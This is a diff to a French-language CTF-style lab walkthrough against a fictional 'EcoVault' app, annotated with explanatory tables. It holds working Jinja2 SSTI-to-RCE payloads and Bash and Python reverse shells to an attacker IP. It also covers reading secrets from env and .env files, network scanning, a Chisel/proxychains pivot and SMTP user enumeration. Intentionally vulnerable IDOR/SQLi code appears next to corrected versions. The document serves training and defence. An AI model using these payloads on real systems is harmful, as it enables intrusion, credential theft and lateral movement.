+| Résultat `77` | Confirme que le moteur est Jinja2 (Python) et non Twig (PHP) |
 
 **Résultat attendu :** `77` (Jinja2 traite `'7'` comme une chaîne et fait la concaténation). Avec Twig (PHP), le résultat serait `49` (conversion implicite en entier).
 
 **Étape 3 — Afficher la configuration Flask**
 
 ```bash
+# {{config}} : variable Jinja2/Flask qui contient toute la configuration de l'application Flask
+# Inclut : SECRET_KEY, URI de base de données, tokens API, mots de passe
+# C'est une étape classique de reconnaissance après confirmation de la SSTI
 curl -s http://ecovault.local/admin/templates \
   -b "token=$TOKEN_ADMIN" \
   -d "template={{config}}"
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `{{config}}` | Objet de configuration Flask contenant SECRET_KEY, SQLALCHEMY_DATABASE_URI, etc. |
+| Intérêt | Permet de récupérer les secrets de l'application avant de passer à l'exécution de commandes (RCE) |
 
 **Résultat :** affiche la configuration Flask avec la SECRET_KEY, l'URI de base de données, etc. Cela confirme l'accès aux objets Python internes.
 
 **Étape 4 — Exécution de commande simple**
 
 ```bash
+# RCE (Remote Code Execution) via SSTI Jinja2
+# Chaîne d'accès aux objets Python internes via l'objet global cycler :
+#   cycler → objet Jinja2 disponible globalement dans les templates
+#   .__init__ → constructeur de l'objet
+#   .__globals__ → dictionnaire des variables globales du module (contient os)
+#   .os → module 'os' importé dans le module Jinja2
+#   .popen('id') → exécute la commande 'id'
+#   .read() → lit la sortie de la commande
 curl -s http://ecovault.local/admin/templates \
   -b "token=$TOKEN_ADMIN" \
   -d "template={{ cycler.__init__.__globals__.os.popen('id').read() }}"
 ```
 
-**Explication de la chaîne d'accès :**
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `cycler` | Objet Jinja2 disponible par défaut dans les templates Flask, point d'entrée pour la RCE |
+| `.__init__` | Accède à la méthode constructeur de l'objet `cycler` |
+| `.__globals__` | Dictionnaire des variables globales du module Python contenant l'import `os` |
+| `.os.popen('id').read()` | Exécute la commande shell `id` et lit le résultat |
+| Résultat attendu | `uid=1000(app) gid=1000(app) groups=1000(app)` — la RCE est confirmée |
+
+**Explication de la chaîne d'accès originale :**
 
 ```
 cycler                    → objet Jinja2 accessible globalement
@@ -727,56 +1087,121 @@ cycler                    → objet Jinja2 accessible globalement
 
 ```bash
 # Lancer un listener netcat sur le port 4444
+# -l : mode écoute (listen), -v : verbeux, -n : pas de DNS, -p 4444 : port d'écoute
 nc -lvnp 4444
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `nc` (netcat) | Outil réseau polyvalent pour lire/écrire sur des connexions TCP/UDP |
+| `-l` | Mode listen : écoute les connexions entrantes |
+| `-v` | Mode verbeux : affiche les informations de connexion |
+| `-n` | Pas de résolution DNS (plus rapide, évite les fuites DNS) |
+| `-p 4444` | Port d'écoute pour la connexion entrante du reverse shell |
 
 **Terminal 2 — Dans l'injection SSTI :**
 
 ```bash
-# Adapter 10.0.0.X avec votre IP (celle de la machine attaquante)
+# Reverse shell Bash : ouvre une connexion TCP vers l'attaquant et redirige les flux
+# bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
+# bash -i : shell interactif, >& /dev/tcp/IP/PORT : redirige stdout/stderr vers le socket
+# 0>&1 : redirige stdin vers stdout (les commandes arrivent au shell depuis le socket)
 curl -s http://ecovault.local/admin/templates \
   -b "token=$TOKEN_ADMIN" \
   -d "template={{ cycler.__init__.__globals__.os.popen('bash -c \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\"').read() }}"
 ```
 
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `bash -c "..."` | Exécute la commande shell passée en argument |
+| `bash -i` | Lance un shell interactif (avec invite de commande) |
+| `>& /dev/tcp/10.0.0.1/4444` | Redirige stdout et stderr vers le socket TCP (fonctionnalité intégrée de Bash) |
+| `0>&1` | Redirige stdin vers stdout (les commandes de l'attaquant arrivent au shell) |
+| Adresse IP `10.0.0.1` | IP de la machine attaquante à adapter selon le réseau du lab |
+| Port `4444` | Port du listener nc en écoute sur la machine attaquante |
+| `/dev/tcp/...` | Pseudo-périphérique Bash qui crée une connexion TCP (feature de bash, pas un vrai fichier) |
+
 **Si le reverse shell ne fonctionne pas** (bash non disponible), essayer avec Python :
 
 ```bash
-# Reverse shell Python (plus fiable)
+# Reverse shell Python : plus fiable que Bash (ne dépend pas de /dev/tcp)
+# import socket,subprocess,os : modules Python pour la connexion réseau et l'exécution
+# s=socket.socket() : crée un socket TCP
+# s.connect(("10.0.0.1",4444)) : se connecte au listener attaquant
+# os.dup2(s.fileno(),N) : duplique le socket vers stdin(0), stdout(1), stderr(2)
+# subprocess.call(["/bin/sh","-i"]) : lance un shell interactif relié au socket
+# Les \\\" sont des échappements pour les guillemets imbriqués (payload dans payload)
 curl -s http://ecovault.local/admin/templates \
   -b "token=$TOKEN_ADMIN" \
   -d "template={{ cycler.__init__.__globals__.os.popen('python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect((\\\"10.0.0.1\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])\"').read() }}"
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `python3 -c "..."` | Exécute le code Python passé en argument |
+| `socket.socket()` | Crée un socket TCP |
+| `s.connect(("10.0.0.1", 4444))` | Connecte le socket au listener de l'attaquant (IP et port) |
+| `os.dup2(s.fileno(), 0)` | Redirige stdin (fd 0) vers le socket |
+| `os.dup2(s.fileno(), 1)` | Redirige stdout (fd 1) vers le socket |
+| `os.dup2(s.fileno(), 2)` | Redirige stderr (fd 2) vers le socket |
+| `subprocess.call(["/bin/sh","-i"])` | Lance un shell interactif (`/bin/sh -i`) dont les flux passent par le socket |
+| Avantage | Plus fiable que le reverse shell Bash car ne dépend pas de `/dev/tcp` (disponible sur plus de systèmes) |
+| `\\\"` | Échappement des guillemets dans le payload SSTI (guillemet dans une chaîne dans une chaîne) |
 
 **Étape 6 — Lire le flag depuis le shell**
 
 Une fois le reverse shell obtenu :
 
 ```bash
-# Dans le shell réversé
-id
-hostname
-cat /app/flag.txt
+# Dans le shell réversé : exploration et capture du flag
+id                  # Affiche l'utilisateur courant (uid, gid, groupes) — www-data
+hostname            # Affiche le nom de la machine (conteneur Docker, permet de s'orienter)
+cat /app/flag.txt   # Lit le fichier contenant le flag (stocké dans le répertoire de l'application)
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `id` | Identité de l'utilisateur : www-data (utilisateur par défaut du serveur web) |
+| `hostname` | Nom d'hôte du conteneur (permet de s'orienter dans le réseau interne) |
+| `cat /app/flag.txt` | Lecture du fichier flag stocké dans le répertoire de l'application |
+| Flag | `flag{ssti_rce_shell_f7c3d9}` |
 
 **Flag obtenu :** `flag{ssti_rce_shell_f7c3d9}`
 
 **Étape 7 — Exploration du serveur**
 
 ```bash
-# Structure de l'application
+# Structure de l'application : liste les fichiers (scripts, templates, config)
 ls -la /app/
 
-# Codes sources
+# Codes sources : analyse du code principal de l'application Flask
 cat /app/app.py
 
-# Variables d'environnement
+# Variables d'environnement : contient souvent des secrets (clés API, mots de passe)
 env
 
-# Fichiers de configuration
+# Fichiers de configuration : base de données, clés secrètes, tokens
 cat /app/config.py
 cat /app/.env
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `ls -la /app/` | Liste détaillée (y compris fichiers cachés) du répertoire de l'application |
+| `cat /app/app.py` | Affiche le code source principal de l'application Flask (vulnérabilités, endpoints) |
+| `env` | Affiche toutes les variables d'environnement (souvent : SECRET_KEY, mots de passe BDD, tokens API) |
+| `cat /app/config.py` | Fichier de configuration de l'application Flask |
+| `cat /app/.env` | Fichier .env contenant les variables sensibles en clair |
 
 #### 4.4.5 Pourquoi ça marche
 
@@ -788,34 +1213,69 @@ from flask import Flask, request, render_template_string
 @app.route('/admin/templates', methods=['POST'])
 def admin_templates():
     template = request.form.get('template', '')
-    # ⚠️ render_template_string interprète le template
+    # ⚠️ render_template_string interprète le template sans aucun échappement
+    # L'attaquant peut injecter du code Jinja2 via le paramètre 'template'
+    # {{ cycler.__init__.__globals__.os.popen('cmd').read() }} permet la RCE
     return render_template_string(template)
 ```
 
-**Explication :** `render_template_string()` de Flask/Jinja2 prend une chaîne et l'interprète comme un template Jinja2. Si la chaîne contient du code template (`{{ }}`), il est exécuté par le moteur. L'attaquant n'a pas besoin de pass sanitization de la saisie.
+**Explication du code vulnérable :**
+
+| Élément | Rôle/Explication |
+|---------|------------------|
+| `render_template_string(template)` | **Faille** : interprète la chaîne utilisateur comme un template Jinja2 sans aucune vérification |
+| `request.form.get('template', '')` | Récupère directement la saisie utilisateur sans filtrage ni validation |
+| `from flask import render_template_string` | Import de la fonction qui exécute le rendu de templates à partir d'une chaîne |
+| Risque | L'attaquant peut exécuter du code Python arbitraire via les globals Jinja2 (`cycler.__init__.__globals__.os.popen()`) |
+| Correction | (1) Utiliser un template fixe et passer la saisie comme variable. (2) Utiliser `render_template("preview.html", content=template)` au lieu de `render_template_string()`. (3) Ne JAMAIS utiliser `render_template_string()` avec une entrée utilisateur |
 
 **Correction :** Ne jamais utiliser `render_template_string()` ou `render_template()` avec une saisie utilisateur. Utiliser `Template(template).render()` avec un sandbox ou passer les variables comme paramètres :
 
 ```python
-# CORRECTION : utiliser un template fixe et passer les variables
+# CORRECTION : utiliser un template fixe et passer la saisie comme variable
+# render_template("preview.html", content=template) charge le fichier preview.html
+# et passe 'template' comme variable accessible dans le fichier via {{ content }}
+# Ainsi, la saisie utilisateur n'est jamais interprétée comme du code Jinja2
 return render_template("preview.html", content=template)
 ```
+
+**Explication de la correction :**
+
+| Élément | Rôle/Explication |
+|---------|------------------|
+| `render_template("preview.html", content=template)` | Utilise un fichier template fixe ; la saisie utilisateur est passée comme **variable** et non comme **code** |
+| `preview.html` | Fichier template statique qui contient `{{ content }}` pour afficher la saisie sans l'interpréter |
+| Principe de sécurité | Séparation stricte entre le code du template (fichier .html) et les données utilisateur (variables) |
 
 #### 4.4.6 Payloads alternatifs
 
 ```bash
-# Lire un fichier directement
+# Alternative 1 : lire un fichier directement via open() (sans passer par os.popen)
+# cycler.__init__.__globals__.open() : accède à la fonction built-in open() de Python
 curl -s -b "token=$TOKEN" -d "template={{ cycler.__init__.__globals__.open('/etc/passwd').read() }}" http://ecovault.local/admin/templates
 
-# Lister un répertoire
+# Alternative 2 : lister un répertoire avec os.listdir()
+# os.listdir('/app') : retourne la liste des fichiers du répertoire /app
 curl -s -b "token=$TOKEN" -d "template={{ cycler.__init__.__globals__.os.listdir('/app') }}" http://ecovault.local/admin/templates
 
-# Avec lipsum (alternative à cycler)
+# Alternative 3 : utiliser lipsum (un autre objet Jinja2 global) au lieu de cycler
+# lipsum.__globals__['os'].popen('id').read() : même principe, objet différent
 curl -s -b "token=$TOKEN" -d "template={{ lipsum.__globals__['os'].popen('id').read() }}" http://ecovault.local/admin/templates
 
-# Avec config.__class__ (troisième méthode)
+# Alternative 4 : utiliser config.__class__ (remonte via la classe de l'objet config)
+# config.__class__.__init__.__globals__['os'].popen('id').read() : troisième chemin d'accès
 curl -s -b "token=$TOKEN" -d "template={{ config.__class__.__init__.__globals__['os'].popen('id').read() }}" http://ecovault.local/admin/templates
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `cycler.__init__.__globals__.open('/etc/passwd').read()` | Lit un fichier directement avec la fonction built-in `open()` (pas besoin d'`os`) |
+| `cycler.__init__.__globals__.os.listdir('/app')` | Liste le contenu d'un répertoire avec `os.listdir()` |
+| `lipsum.__globals__['os'].popen('id')` | Alternative avec l'objet `lipsum` (autre global Jinja2) — contourne les éventuels filtres sur `cycler` |
+| `config.__class__.__init__.__globals__['os'].popen('id')` | Troisième chemin via l'objet `config` et sa classe — autre méthode si les précédentes sont bloquées |
+| Intérêt des alternatives | Si l'un des objets (`cycler`) est bloqué ou supprimé par un patch, les autres peuvent encore fonctionner |
 
 ---
 
@@ -850,14 +1310,29 @@ curl -s -b "token=$TOKEN" -d "template={{ config.__class__.__init__.__globals__[
 Depuis le reverse shell :
 
 ```bash
-# Voir notre IP
+# Voir notre IP (affiche les adresses IP de toutes les interfaces)
 hostname -I
 
-# Scan du réseau local
+# Scan du réseau local par ping sweep (découverte des machines actives)
+# for i in $(seq 1 254) : boucle sur les 254 adresses du sous-réseau /24
+# ping -c 1 -W 1 : envoie 1 paquet ICMP avec timeout de 1 seconde
+# grep "bytes from" : filtre les réponses positives (machine active)
+# & : exécute chaque ping en arrière-plan (parallélisation)
 for i in $(seq 1 254); do
     (ping -c 1 -W 1 10.0.0.$i | grep "bytes from" &)
 done
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `hostname -I` | Affiche toutes les adresses IP de la machine (sans le nom d'hôte) |
+| `for i in $(seq 1 254)` | Boucle sur toutes les adresses du réseau /24 (10.0.0.1 à 10.0.0.254) |
+| `ping -c 1 -W 1` | Envoie 1 paquet ICMP Echo Request avec un timeout de 1 seconde |
+| `grep "bytes from"` | Ne conserve que les lignes indiquant une réponse positive |
+| `&` | Exécution en arrière-plan : tous les pings sont lancés en parallèle pour accélérer le scan |
+| Résultat | Machines découvertes : 10.0.0.1 (attaquant/passerelle), 10.0.0.5 (serveur web actuel), 10.0.0.10 (serveur interne cible) |
 
 **Résultat :**
 
@@ -870,12 +1345,31 @@ done
 Ou avec `nmap` si disponible :
 
 ```bash
-# Vérifier si nmap est installé
+# Vérifier si nmap est installé ; sinon l'installer silencieusement
+# which nmap : teste la présence de nmap dans le PATH
+# || : si la commande précédente échoue, exécute l'installation
+# apt-get install -y nmap : installe nmap sans confirmation
+# 2>/dev/null : supprime les messages d'erreur (stderr)
 which nmap || apt-get install -y nmap 2>/dev/null
 
-# Scan des services sur 10.0.0.10
+# Scan des services sur 10.0.0.10 avec détection de version
+# -sV : détection de version des services
+# -p- : scan de tous les ports (1-65535)
+# --min-rate=1000 : vitesse minimale de 1000 paquets/seconde (accélère le scan)
 nmap -sV -p- 10.0.0.10 --min-rate=1000
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `which nmap` | Vérifie si l'exécutable `nmap` est présent sur le système |
+| `apt-get install -y nmap` | Installe nmap automatiquement (sans interaction utilisateur) |
+| `2>/dev/null` | Redirige les erreurs (stderr) vers /dev/null (installation silencieuse) |
+| `nmap -sV` | Active la détection de version des services (bannir et fingerprint) |
+| `-p-` | Scan de la totalité des 65535 ports TCP |
+| `--min-rate=1000` | Fixe un débit minimum de 1000 paquets/s pour accélérer le scan |
+| Résultat | Ports ouverts : 25/tcp (SMTP) et 8081/tcp (HTTP) |
 
 **Résultat :**
 
@@ -891,6 +1385,10 @@ nmap -sV -p- 10.0.0.10 --min-rate=1000
 **Terminal 1 (machine attaquante) :** servir le binaire chisel via HTTP
 
 ```bash
+# Télécharger Chisel depuis GitHub (machine attaquante)
+wget -O chisel.gz https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
+gunzip chisel.gz && chmod +x chisel
+
 # Vérifier l'architecture du serveur cible (depuis le reverse shell)
 uname -m
 # Résultat probable : x86_64
@@ -916,38 +1414,65 @@ chmod +x /tmp/chisel
 **Terminal 1 (machine attaquante) :** lancer le serveur Chisel
 
 ```bash
+# ./chisel server : lance Chisel en mode serveur
+# --port 8080 : écoute sur le port 8080 pour les connexions entrantes
+# --reverse : mode reverse (le client se connecte au serveur, pas l'inverse)
+# --socks5 : active le proxy SOCKS5 pour router le trafic
 ./chisel server --port 8080 --reverse --socks5
 ```
 
-**Explication :**
-- `--port 8080` : Chisel écoute sur le port 8080
-- `--reverse` : mode reverse (le client se connecte au serveur)
-- `--socks5` : active le proxy SOCKS5
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `./chisel` | Binaire Chisel (outil de tunneling) |
+| `server` | Mode serveur : écoute les connexions entrantes des clients |
+| `--port 8080` | Port d'écoute du serveur Chisel |
+| `--reverse` | Mode reverse : le serveur reçoit les connexions des clients (ne nécessite pas que le client soit accessible) |
+| `--socks5` | Active un proxy SOCKS5 sur le serveur (le trafic du client est tunnelisé vers le réseau cible) |
 
 **Terminal 2 (reverse shell) :** lancer le client Chisel
 
 ```bash
+# /tmp/chisel client : lance Chisel en mode client
+# 10.0.0.1:8080 : adresse IP du serveur Chisel (machine attaquante) et son port
+# R:socks : demande un tunnel SOCKS5 reverse (le trafic est redirigé vers le réseau du client)
 /tmp/chisel client 10.0.0.1:8080 R:socks
 ```
 
-**Explication :**
-- `client` : mode client
-- `10.0.0.1:8080` : adresse du serveur Chisel
-- `R:socks` : tunnel reverse SOCKS5
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `client` | Mode client : se connecte au serveur Chisel |
+| `10.0.0.1:8080` | Adresse et port du serveur Chisel (machine attaquante) |
+| `R:socks` | Reverse SOCKS : le client Chisel (sur le serveur compromis) expose son réseau au serveur Chisel (attaquant) via un tunnel SOCKS5 |
+
+**Architecture du tunnel :**
+
+```
+[Attaquant] ← Tunnel SOCKS5 ← [Serveur Web] ←→ [Réseau Interne 10.0.0.0/24]
+   └─> proxychains curl http://10.0.0.10:8081   └─> 10.0.0.10:8081 (HTTP)
+       proxychains nc -v 10.0.0.10 25               10.0.0.10:25   (SMTP)
+```
 
 **Étape 4 — Configurer proxychains**
 
 Sur la machine attaquante, éditer `/etc/proxychains4.conf` :
 
 ```bash
-# Dans /etc/proxychains4.conf, ajouter à la fin :
-socks5 127.0.0.1 1080
+# Ajouter la configuration du proxy SOCKS5 pour Chisel
+sudo sh -c 'echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf'
 ```
 
 **Étape 5 — Scanner le serveur interne via le tunnel**
 
 ```bash
-# nmap à travers le tunnel SOCKS
+# nmap à travers le tunnel SOCKS via proxychains
+# proxychains : intercepte les connexions TCP et les route via le proxy SOCKS5 (Chisel)
+# -sT : scan TCP Connect (seul mode compatible avec proxychains)
+# -sV : détection de version des services
+# -p 8081,25 : scanne uniquement les ports identifiés précédemment
 proxychains nmap -sT -sV -p 8081,25 10.0.0.10
 
 # Résultat attendu :
@@ -955,66 +1480,130 @@ proxychains nmap -sT -sV -p 8081,25 10.0.0.10
 # 8081/tcp open  http     ?
 ```
 
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `proxychains` | Préfixe qui force le trafic de l'outil à passer par le proxy SOCKS5 configuré |
+| `nmap -sT` | Scan TCP Connect (complète la poignée de main TCP) — seul mode compatible avec les proxys |
+| `-sV` | Détection de version des services à partir de leurs bannières |
+| `-p 8081,25` | Limite le scan aux ports 8081 (HTTP) et 25 (SMTP) |
+| `10.0.0.10` | Adresse IP du serveur interne (uniquement accessible via le tunnel) |
+
 **Étape 6 — Accéder au serveur HTTP interne**
 
 ```bash
-# Utiliser curl via proxychains
+# Utiliser curl via proxychains pour accéder au serveur HTTP interne
+# Tout le trafic passe par le tunnel Chisel -> serveur web compromis -> serveur interne
 proxychains curl http://10.0.0.10:8081/
 ```
 
 **Réponse :** page d'accueil du serveur interne EcoVault.
 
 ```bash
-# Chercher des endpoints intéressants
+# Chercher des endpoints intéressants sur le serveur interne
+# /flag.txt : tentative de lecture directe du flag (parfois accessible)
 proxychains curl http://10.0.0.10:8081/flag.txt
 
 # → Flag 5 directement si le fichier est accessible
 ```
 
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `proxychains curl` | Curl dont le trafic est redirigé via le proxy SOCKS5 de Chisel |
+| `http://10.0.0.10:8081/` | Page d'accueil du serveur HTTP interne (inaccessible directement depuis l'extérieur) |
+| `http://10.0.0.10:8081/flag.txt` | Tentative de récupération directe du flag (parfois mal protégé) |
+
 **Étape 7 — Interroger le serveur SMTP**
 
 ```bash
 # Connexion SMTP via netcat à travers proxychains
+# nc -v : mode verbeux (affiche les bannières et les réponses du serveur)
+# 10.0.0.10 25 : adresse et port SMTP du serveur interne
 proxychains nc -v 10.0.0.10 25
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `proxychains nc` | Netcat dont le trafic est redirigé via le tunnel SOCKS5 |
+| `-v` | Mode verbeux : affiche les bannières du serveur SMTP |
+| `25` | Port SMTP standard |
 
 **Interaction SMTP :**
 
 ```smtp
-EHLO attacker
-MAIL FROM:<attacker@test.com>
-RCPT TO:<admin@ecovault.com>
-DATA
-Subject: Test
-.
-QUIT
+EHLO attacker       # Salutation SMTP (Extended HELO) : identifie le client
+MAIL FROM:<attacker@test.com>  # Expéditeur du message (enveloppe SMTP)
+RCPT TO:<admin@ecovault.com>   # Destinataire du message
+DATA                # Début du corps du message (terminé par un point seul sur une ligne)
+Subject: Test       # En-tête du message
+.                   # Fin du message (point seul sur une ligne)
+QUIT                # Fermeture de la connexion SMTP
 ```
+
+**Explication des commandes SMTP :**
+
+| Commande SMTP | Rôle/Explication |
+|---------------|------------------|
+| `EHLO` | Extended HELO : salutation SMTP avec annonce des extensions supportées (ESMTP) |
+| `MAIL FROM:` | Définit l'expéditeur de l'enveloppe SMTP (adresse de retour) |
+| `RCPT TO:` | Définit le(s) destinataire(s) du message |
+| `DATA` | Débute la transmission du corps du message (headers + body) ; terminé par `CRLF.CRLF` |
+| `.` | Point seul sur une ligne : marque la fin du message DATA |
+| `QUIT` | Ferme la connexion SMTP |
 
 Pour récupérer les messages stockés, on peut essayer de s'authentifier ou d'exploiter une vulnérabilité SMTP :
 
 ```bash
-# VRFY (énumération des utilisateurs)
+# VRFY (Verify) : énumération des utilisateurs SMTP
+# La commande VRFY vérifie si un utilisateur existe sur le serveur
+# << EOF ... EOF : redirige le contenu entre les marqueurs vers nc (entrée standard)
+# prochaine commande : envoie VRFY admin -> réponse "252 2.0.0 admin" (existe)
 proxychains nc -v 10.0.0.10 25 << EOF
-EHLO attacker
-VRFY admin
-VRFY root
-VRFY user
-QUIT
+EHLO attacker    # Salutation SMTP
+VRFY admin       # Vérifie si 'admin' est un utilisateur valide
+VRFY root        # Vérifie si 'root' est un utilisateur valide
+VRFY user        # Vérifie si 'user' est un utilisateur valide
+QUIT             # Fermeture
 EOF
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `VRFY` | Commande SMTP qui vérifie si une boîte aux lettres existe sur le serveur (énumération d'utilisateurs) |
+| `<< EOF ... EOF` | Here-document : envoie le contenu comme entrée standard de la commande (simule une session) |
+| `VRFY admin` | Teste l'existence de l'utilisateur 'admin' — réponse positive (252) → utilisateur existe |
+| Attaque | Cette énumération permet à l'attaquant de découvrir les comptes SMTP valides pour des tentatives ultérieures |
 
 **Étape 8 — Récupérer le flag (Flag 5)**
 
 Le flag peut être stocké dans un message SMTP ou accessible via l'interface HTTP interne :
 
 ```bash
-# Via HTTP
+# Exploration des endpoints HTTP du serveur interne
+# /messages : endpoint potentiel listant les messages stockés
 proxychains curl http://10.0.0.10:8081/messages
-# ou
+# /emails : endpoint alternatif pour les emails
 proxychains curl http://10.0.0.10:8081/emails
-# ou
+# /api/messages : endpoint API REST pour les messages
 proxychains curl http://10.0.0.10:8081/api/messages
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `proxychains curl` | Curl dont le trafic passe par le tunnel SOCKS5 vers le réseau interne |
+| `/messages` | Endpoint HTTP qui liste les messages stockés sur le serveur interne |
+| `/emails` | Endpoint alternatif (alias ou endpoint complémentaire) |
+| `/api/messages` | Endpoint API REST exposant les messages au format JSON |
+| Résultat | Le flag se trouve dans la réponse JSON de l'un de ces endpoints |
 
 **Réponse attendue (Flag 5) :**
 
@@ -1205,11 +1794,23 @@ Score de couverture global : 94%
 @app.route('/api/profile/<int:user_id>')
 @jwt_required
 def api_profile(user_id):
-    current_user_id = get_jwt_identity()  # ← ne JAMAIS utilisé
-    # ⚠️ Aucune comparaison entre user_id et current_user_id
+    current_user_id = get_jwt_identity()  # ← ne JAMAIS utilisé (ligne présente mais ignorée)
+    # ⚠️ Aucune comparaison entre user_id et current_user_id : l'ID de l'URL est utilisé sans vérification
+    # Tout utilisateur peut consulter le profil de n'importe quel autre utilisateur (IDOR)
+    # De plus, la requête SQL est construite par f-string (SQLi potentielle)
     user = query_db(f"SELECT * FROM users WHERE id = {user_id}", one=True)
     return jsonify(user)
 ```
+
+**Explication du code vulnérable :**
+
+| Élément | Rôle/Explication |
+|---------|------------------|
+| `@jwt_required` | Décorateur qui vérifie la présence d'un JWT valide (mais pas les droits d'accès) |
+| `get_jwt_identity()` | Récupère l'ID de l'utilisateur à partir du JWT — mais cette valeur n'est **jamais utilisée** |
+| `user_id` | Provient directement de l'URL (`/api/profile/1` → `user_id=1`) — contrôlé par l'attaquant |
+| `f"SELECT * FROM users WHERE id = {user_id}"` | **Double faille** : (1) IDOR car pas de vérification de propriété, (2) SQLi par concaténation directe |
+| Risque | Tout utilisateur connecté peut accéder aux données de n'importe quel utilisateur (y compris admin) |
 
 **Cause racine :** L'extraction de l'identité JWT est présente (`get_jwt_identity()`) mais jamais utilisée. Le code récupère l'ID depuis l'URL (`user_id`) et exécute la requête sans vérifier que `user_id == current_user_id`.
 
@@ -1223,24 +1824,35 @@ def api_profile(user_id):
 def api_profile(user_id):
     current_user_id = get_jwt_identity()
 
-    # ✅ Vérification d'appartenance
+    # ✅ Vérification d'appartenance : compare l'ID de l'URL avec l'ID du JWT
     if user_id != current_user_id:
-        # Vérifier si l'utilisateur est admin (exception pour les admins)
+        # Exception pour les admins (ils peuvent voir tous les profils)
         current_user = query_db("SELECT role FROM users WHERE id = ?", (current_user_id,), one=True)
         if not current_user or current_user['role'] != 'admin':
             return jsonify({'error': 'Accès non autorisé'}), 403
 
-    # ✅ Requête paramétrée (sécurise aussi contre la SQLi)
+    # ✅ Requête paramétrée (utilise ? comme placeholder)
     user = query_db("SELECT id, email, role, created_at FROM users WHERE id = ?", (user_id,), one=True)
     if not user:
         return jsonify({'error': 'Utilisateur non trouvé'}), 404
 
-    # Ne jamais exposer api_key sauf pour l'utilisateur lui-même
+    # ✅ L'api_key n'est exposée que pour l'utilisateur lui-même ou les admins
     if user['id'] == current_user_id or (current_user and current_user['role'] == 'admin'):
         user = query_db("SELECT id, email, role, api_key, created_at FROM users WHERE id = ?", (user_id,), one=True)
 
     return jsonify(user)
 ```
+
+**Explication du code corrigé :**
+
+| Élément | Rôle/Explication |
+|---------|------------------|
+| `current_user_id = get_jwt_identity()` | Récupère l'ID depuis le JWT (source fiable) |
+| `if user_id != current_user_id` | Vérifie que l'utilisateur demande son propre profil |
+| `current_user['role'] == 'admin'` | Exception pour les administrateurs légitimes |
+| `query_db(..., (user_id,), one=True)` | Requête paramétrée avec placeholder `?` → protection SQLi |
+| `SELECT ... ` (colonnes listées) | Spécifie explicitement les colonnes à retourner (pas de `*`) |
+| Filtre de l'`api_key` | L'api_key n'est transmise que si c'est le profil de l'utilisateur ou un admin |
 
 #### Références
 
@@ -1261,11 +1873,23 @@ def api_profile(user_id):
 @jwt_required
 def api_transactions():
     filter_val = request.args.get('filter', '')
-    # ⚠️ Concaténation directe dans une f-string SQL
+    # ⚠️ Concaténation directe dans une f-string SQL (f"...{filter_val}...")
+    # La valeur du paramètre 'filter' est insérée sans aucun échappement
+    # L'attaquant peut injecter : ' UNION SELECT ... -- , ' OR 1=1, SLEEP(3), etc.
     query = f"SELECT id, transaction_ref, montant, devise FROM transactions WHERE id = '{filter_val}'"
     results = query_db(query)
     return jsonify(results)
 ```
+
+**Explication du code vulnérable :**
+
+| Élément | Rôle/Explication |
+|---------|------------------|
+| `request.args.get('filter', '')` | Récupère le paramètre GET `filter` sans validation |
+| `f"SELECT ... WHERE id = '{filter_val}'"` | **Faille** : la f-string Python insère la valeur brute dans la requête SQL (concaténation) |
+| `'{filter_val}'` | Les guillemets simples autour de la valeur permettent de "casser" la chaîne SQL |
+| Risque | L'attaquant peut injecter des clauses SQL arbitraires : `UNION SELECT`, `ORDER BY`, `SLEEP()`, etc. |
+| Données exposées | Tables `users` (emails, mots de passe), `transactions`, `coupons` |
 
 **Cause racine :** La chaîne SQL est construite par concaténation avec une **f-string Python** (`f"..."`). La valeur du paramètre `filter` est insérée directement sans aucune échappement ni paramétrisation.
 
@@ -1279,19 +1903,29 @@ def api_transactions():
 def api_transactions():
     filter_val = request.args.get('filter', '')
 
-    # ✅ Requête paramétrée avec placeholder (?)
+    # ✅ Requête paramétrée avec placeholder (?) : la valeur est transmise séparément du plan SQL
+    # Le SGBD traite filter_val comme une donnée, pas comme du code SQL
+    # Même ' OR 1=1 -- est échappé automatiquement
     query = "SELECT id, transaction_ref, montant, devise FROM transactions WHERE id = ?"
     results = query_db(query, (filter_val,))
 
     return jsonify(results)
 ```
 
+**Explication du code corrigé :**
+
+| Élément | Rôle/Explication |
+|---------|------------------|
+| `WHERE id = ?` | Placeholder `?` : le SGBD remplit ce paramètre avec la valeur de manière sécurisée |
+| `query_db(query, (filter_val,))` | Les paramètres sont passés séparément de la requête (prévention SQLi) |
+| Mécanisme de protection | Le SGBD compile d'abord le plan de requête, puis insère les valeurs — elles ne peuvent pas être interprétées comme du SQL |
+
